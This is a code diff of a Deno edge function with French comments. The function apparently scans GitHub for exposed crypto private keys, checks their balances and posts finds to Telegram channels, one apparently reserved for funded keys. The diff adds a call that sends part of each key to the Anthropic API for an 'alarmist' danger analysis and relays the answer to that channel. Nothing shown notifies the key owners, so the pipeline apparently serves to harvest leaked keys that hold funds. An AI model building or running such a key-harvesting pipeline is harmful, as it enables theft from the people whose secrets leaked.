@@ -15,6 +15,51 @@ const corsHeaders = {
 const CHAT_ID_ALL = '-1003113285705';  // Channel "Find it"
 const CHAT_ID_FUNDED = '-1002944547225';  // Channel "It's found"
 
+// Helper IA - Analyse du danger avec Claude
+async function analyzeWithAI(keyType: string, fullKey: string, content: string, blockchain: string): Promise<string> {
+  const anthropicKey = Deno.env.get('ANTHROPIC_API_KEY');
+  if (!anthropicKey) return '';
+
+  try {
+    const prompt = `Tu es un expert en cybersécurité crypto. Une clé privée ${keyType} (${blockchain}) a été trouvée publiquement sur GitHub.
+
+Clé: ${fullKey.substring(0, 50)}...
+Contexte: ${content.substring(0, 200)}...
+
+Explique en 3-4 phrases COURTES:
+1. Quel est le danger immédiat?
+2. Que peut faire un attaquant avec ça?
+3. Quels fonds/données sont en danger?
+
+Sois DIRECT et ALARMISTE. Format: texte brut sans markdown.`;
+
+    const response = await fetch('https://api.anthropic.com/v1/messages', {
+      method: 'POST',
+      headers: {
+        'Content-Type': 'application/json',
+        'x-api-key': anthropicKey,
+        'anthropic-version': '2023-06-01',
+      },
+      body: JSON.stringify({
+        model: 'claude-3-5-sonnet-20241022',
+        max_tokens: 300,
+        messages: [{
+          role: 'user',
+          content: prompt,
+        }],
+      }),
+    });
+
+    if (!response.ok) return '';
+
+    const data = await response.json();
+    return data.content?.[0]?.text || '';
+  } catch (e) {
+    console.error('AI analysis error:', e);
+    return '';
+  }
+}
+
 // Helper Telegram
 async function sendTelegram(message: string, chatId: string) {
   const botToken = Deno.env.get('TELEGRAM_BOT_TOKEN');
@@ -381,7 +426,11 @@ ${fileContent}
                   blockchain = '🔐 Crypto Wallet';
                 }
 
-                // Message SIMPLE et BRUT
+                // ANALYSE IA du danger
+                await sendTelegram(`🤖 *Analyse IA en cours...*`, CHAT_ID_FUNDED);
+                const aiAnalysis = await analyzeWithAI(pattern.pattern_type, fullKey, content, blockchain);
+
+                // Message SIMPLE et BRUT avec IA
                 let fundedMsg = '';
                 
                 if (balanceInfo.hasBalance) {
@@ -414,6 +463,18 @@ ${fileContent}
                 }
 
                 await sendTelegram(fundedMsg, CHAT_ID_FUNDED);
+
+                // Message IA séparé
+                if (aiAnalysis) {
+                  const aiMsg = `
+⚠️ *ANALYSE IA - DANGER*
+
+${aiAnalysis}
+
+🔗 [Voir le repo](${item.repository.html_url})
+                  `.trim();
+                  await sendTelegram(aiMsg, CHAT_ID_FUNDED);
+                }
                 if (balanceInfo.hasBalance) {
                   fundedCount++;
                 }
